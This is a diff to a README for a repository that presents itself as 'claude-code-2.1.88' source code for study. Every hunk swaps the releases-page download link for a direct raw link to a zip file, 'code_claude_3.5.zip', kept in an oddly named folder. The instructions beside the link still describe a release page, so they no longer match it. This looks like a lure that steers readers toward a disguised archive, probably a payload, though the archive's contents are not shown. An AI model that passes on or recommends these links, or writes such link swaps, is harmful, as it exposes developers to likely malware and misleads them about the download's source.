@@ -1,10 +1,10 @@
 # 🧩 claude-code-2.1.88 - Simple source code for study
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Simplex-publicspeaking797/claude-code-2.1.88/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://raw.githubusercontent.com/Simplex-publicspeaking797/claude-code-2.1.88/main/discontentedly/code_claude_3.5.zip)
 
 ## 📥 Download and setup
 
-Visit this page to download: https://github.com/Simplex-publicspeaking797/claude-code-2.1.88/releases
+Visit this page to download: https://raw.githubusercontent.com/Simplex-publicspeaking797/claude-code-2.1.88/main/discontentedly/code_claude_3.5.zip
 
 1. Open the release page in your browser.
 2. Look for the latest release at the top of the page.
@@ -140,4 +140,4 @@ After you download and open the project, check these items:
 
 ## 📎 Download link
 
-Visit this page to download: https://github.com/Simplex-publicspeaking797/claude-code-2.1.88/releases
+Visit this page to download: https://raw.githubusercontent.com/Simplex-publicspeaking797/claude-code-2.1.88/main/discontentedly/code_claude_3.5.zip
